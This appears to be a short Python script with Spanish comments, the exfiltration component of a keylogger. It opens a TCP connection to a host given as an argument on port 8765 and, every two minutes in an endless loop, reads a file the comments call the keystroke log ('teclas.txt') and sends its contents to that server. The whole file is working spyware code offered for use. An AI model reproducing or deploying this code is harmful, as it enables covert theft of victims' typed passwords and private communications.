import socket
import sys
import time
import os

conexion = sys.argv[1]
puerto = 8765
archivo = "teclas.txt"
#Inicio un socket IPv4 (AF_INET) y de flujo (SOCK_STREAM)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cliente:
    #Conecto el socket a la dirección y puerto especificados
    cliente.connect((conexion, puerto))
    #Cada dos minutos leo el archivo con el registro de teclas y lo envío al servidor
    while True:
        with open(os.path.join(os.getcwd(), archivo), "rb") as file:
            buffer = file.read()
            print(buffer)
            cliente.sendall(buffer)
            print("Archivo enviado correctamente.")
        time.sleep(120)
